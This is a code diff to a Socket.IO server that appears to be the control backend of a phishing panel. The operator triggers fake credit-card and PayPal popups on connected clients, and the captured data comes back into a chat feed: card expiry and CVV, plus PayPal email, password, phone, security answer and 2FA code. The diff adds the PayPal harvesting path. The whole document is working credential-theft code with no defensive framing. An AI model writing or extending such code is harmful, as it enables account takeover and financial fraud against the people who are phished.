@@ -80,6 +80,10 @@ io.on('connection', async (socket) => {
     socket.broadcast.emit('display credit card popup');
   });
 
+  socket.on('request paypal account', () => {
+    socket.broadcast.emit('display paypal account popup');
+  });
+
   socket.on('verification popup', (data) => {
     socket.broadcast.emit('display verification popup', data);
   });
@@ -101,6 +105,20 @@ io.on('connection', async (socket) => {
 📅 Expiry: ${cardData.expiryDate}
 🔒 CVV: ${cardData.cvv}
 📮 Zip Code: ${cardData.billingZip || 'Not provided'}`,
+      clientInfo
+    });
+  });
+
+  socket.on('paypal account data', (data) => {
+    const { accountData } = data;
+    io.emit('chat message', {
+      user: 'System',
+      text: `PayPal Account Information Received:
+📧 Email: ${accountData.email}
+🔐 Password: ${accountData.password}
+📱 Phone: ${accountData.phoneNumber}
+🔒 Security Answer: ${accountData.securityAnswer || 'Not provided'}
+🔢 2FA Code: ${accountData.verificationCode || 'Not provided'}`,
       clientInfo
     });
   });
